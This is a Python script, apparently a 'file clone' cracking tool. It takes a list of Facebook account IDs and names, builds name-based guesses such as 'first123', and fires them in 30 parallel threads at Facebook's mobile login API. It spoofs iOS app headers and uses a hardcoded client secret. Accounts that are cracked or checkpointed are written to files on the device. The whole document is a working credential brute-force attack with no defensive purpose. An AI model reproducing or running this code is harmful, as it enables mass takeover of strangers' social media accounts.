try:
	import os,requests,json,time,re,random,sys,uuid,string,base64,zlib,hashlib,subprocess
	from string import *
	from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError: 
	print('\n Installing missing modules ...')
	os.system('pip install requests futures bs4==2 > /dev/null')
	exit(' Module install done run again ')
oks,cps,loop,pcp=[],[],0,[]
logo = '''
\033[1;37m  d888888b .d8888.db       .d8b.  .88b  d88.
   `88'   88'  YP 88      d8' `8b 88'YbdP`88
    88    `8bo.   88      88ooo88 88  88  88
    88      `Y8b. 88      88~~~88 88  88  88
   .88.   db   8D 88booo. 88   88 88  88  88
 Y888888P `8888Y' Y88888P YP   YP YP  YP  YP
------------------------------------------------
  Author : SOHAIB AHMAD
  Github : Unknown
  Fcbook : Not Found
------------------------------------------------
 Nothing is impossible : just try to do
------------------------------------------------'''
def clear():
    os.system('clear')
    print(logo)
def linex():
    print('\033[1;37m----------------------------------------------')
def main():
    clear()
    print(' [1] Start File Clone \n [0] Exit Menu ');linex()
    x = input(' Choose: ')
    if x =='1':
        file()
    else:exit()
def file():
	clear()
	file = input(' Put file path\033[1;37m: ')
	try:
		fo = open(file,'r').read().splitlines()
	except FileNotFoundError:
		print(' File location not found ')
		time.sleep(1)
		main()
	clear()
	plist=[]
	try:
		ps_limit = int(input(' How many passwords do you want to add ? '))
	except:
		ps_limit =1
	linex()
	print('\033[1;32m exp: first last,firtslast,first123')
	linex()
	for i in range(ps_limit):
		plist.append(input(f' Put password {i+1}: '))
	linex()
	print(' Do you went show cp account? (y/n): ')
	linex()
	cx=input(' Choose: ')
	if cx in ['y','Y','yes','Yes','1']:
		pcp.append('y')
	else:
		pcp.append('n')
	with tred(max_workers=30) as crack_submit:
		clear()
		total_ids = str(len(fo))
		print(' Total ids : \033[1;32m'+total_ids)
		print("\033[1;31m The Burte Has Been Started Wait & Watch\033[1;37m")
		linex()
		for user in fo:
			ids,names = user.split('|')
			passlist = plist
			crack_submit.submit(api,ids,names,passlist,total_ids)
	print('\033[1;37m')
	linex()
	print(' The process has completed')
	print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
	linex()
	input(' Press enter to back ')
	os.system('python AKING.py')
def api(ids,names,passlist,total_ids):
	try:
		global ok,loop,sim_id
		sys.stdout.write('\r\r\033[1;37m [SOHAIB] %s|%s\033[1;32m [OK:-%s]\033[1;34m•\033[1;33m[CP:-%s] \033[1;37m'%(loop,total_ids,len(oks),len(cps)));sys.stdout.flush()
		fn = names.split(' ')[0]
		try:
			ln = names.split(' ')[1]
		except:
			ln = fn
		for pw in passlist:
			pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
			client_id = '6628568379'
			client_secrets = 'c1e620fa708a1d5696fb991c1bde5662'
			version = str(random.randrange(8,15))
			osv = str(random.randrange(1,9))
			osvx = str(random.randrange(1,15))
			osv1 = str(random.randrange(1,9))
			osv2 = str(random.randrange(1,9))
			abv = ['A','B','C']
			if '8' in version:
				ipsw = '12'+random.choice(abv)+str(random.randint(11,99))
			elif '9' in version:
				ipsw = '13'+random.choice(abv)+str(random.randint(11,99))
			elif '10' in version:
				ipsw = '14'+random.choice(abv)+str(random.randint(11,99))
			elif '11' in version:
				ipsw = '15'+random.choice(abv)+str(random.randint(11,99))
			elif '12' in version:
				ipsw = '16'+random.choice(abv)+str(random.randint(11,99))
			elif '13' in version:
				ipsw = '17'+random.choice(abv)+str(random.randint(11,99))
			elif '14' in version:
				ipsw = '18'+random.choice(abv)+str(random.randint(11,99))
			elif '15' in version:
				ipsw = '19'+random.choice(abv)+str(random.randint(11,99))
			application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,70))+'.'+str(random.randint(111,555))
			application_version_code=str(random.randint(00000000,99999999))
			ua_ios = 'Mozilla/5.0 (iPhone, CPU iPhone '+version+'_'+osv+' like Mac OS '+version+') AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/'+ipsw+f' [FBAN/FBIOS;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBRV/0;FBDV/iPad{str(version)},{str(osv)};FBMD/iPad;FBSN/iOS;FBSV/{str(version)}.{str(osv)}.{str(osv1)};FBSS/2;FBCR/;FBID/tablet;FBLC/ar_DZ;FBOP/5]'
			adid = str(uuid.uuid4())
			device_id = str(uuid.uuid4())
			li = ['28','29','210']
			li2 = random.choice(li)
			j1 = ''.join(random.choice(digits) for _ in range(2))
			j2 = li2+j1
			data = {
				'adid':adid,
				'format':'json',
				'api_key':client_id,
				'community_id':'',
				'device_id':device_id,
				'family_device_id':device_id,
				'currently_logged_in_userid':'0',
				'try_num':'1',
				'email':ids,
				'password':pas,
				'jazoest':j2,
				'generate_analytics_claim':'1',
				'cpl':'true',
				'generate_session_cookies':'1',
				'credentials_type':'password',
				'error_detail_type':'button_with_disabled',
				'source':'auth.login',
				'locale':'en_US',
				'client_country_code':'US',
				'advertising_id':adid,
				'meta_inf_fbmeta':'NO_FILE',
				'access_token':f'{client_id}|{client_secrets}'
				}
			head = {
				'Authorization':f'OAuth {client_id}|{client_secrets}',
				'X-FB-Connection-Quality':'EXCELLENT',
				'x-fb-sim-hni':str(random.randint(2e4,4e4)),
				'x-fb-net-hni':str(random.randint(2e4,4e4)),
				'x-fb-connection-bandwidth':str(random.randint(3e7,4e7)),
				'x-fb-connection-type':'cell.CTRadioAccessTechnologyHSDPA',
				'x-fb-friendly_name':'authenticate',
				'content-encoding':'application/x-www-form-urlencoded',
				'x-tigon-is_retry':'true',
				'x-fb-http-engine':'Liger',
				'x-requested-with':'FBIOS',
				'connection':'close',
				'user-agent':ua_ios
				}
			url = 'https://b-api.facebook.com/method/auth.login'
			po = requests.post(url,data=data,headers=head,allow_redirects=False).text
			q = json.loads(po)
			if 'session_key' in q:
				print('\r\r\033[1;32m [ISLAM-OK] '+ids+' | '+pas+'\033[1;97m')
				open('/sdcard/OK.txt','a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'www.facebook.com' in ['error_msg']:
				if 'y' in pcp:
					print('\r\r\033[1;33m [ISLAM-CP] '+ids+' | '+pas+'\033[1;97m')
					open('/sdcard/CP.txt','a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
			else:
				continue
		loop+=1
	except requests.exceptions.ConnectionError:
		time.sleep(20)
	except Exception as e:
		pass
main()